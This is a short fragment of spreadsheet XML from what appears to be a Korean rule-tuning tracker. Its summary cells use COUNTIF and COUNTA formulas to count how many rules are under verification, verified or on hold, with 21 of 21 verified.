      <c r="B21" s="59" t="s">
        <v>461</v>
      </c>
      <c r="C21" s="48">
        <f>COUNTIF('룰튜닝관리'!K4:K24,"검증중")</f>
        <v>0</v>
      </c>
    </row>
    <row r="22" ht="15.75" customHeight="1">
      <c r="B22" s="59" t="s">
        <v>130</v>
      </c>
      <c r="C22" s="48">
        <f>COUNTIF('룰튜닝관리'!K4:K24,"검증완료")</f>
        <v>21</v>
      </c>
    </row>
    <row r="23" ht="15.75" customHeight="1">
      <c r="B23" s="59" t="s">
        <v>462</v>
      </c>
      <c r="C23" s="48">
        <f>COUNTIF('룰튜닝관리'!K4:K24,"보류")</f>
        <v>0</v>
      </c>
    </row>
    <row r="24" ht="15.75" customHeight="1">
      <c r="B24" s="57" t="s">
        <v>463</v>
      </c>
      <c r="C24" s="63">
        <f>COUNTA('룰튜닝관리'!A4:A24)</f>
        <v>21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T40" s="1" t="s">
        <v>464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2026-06-05T00:45:07Z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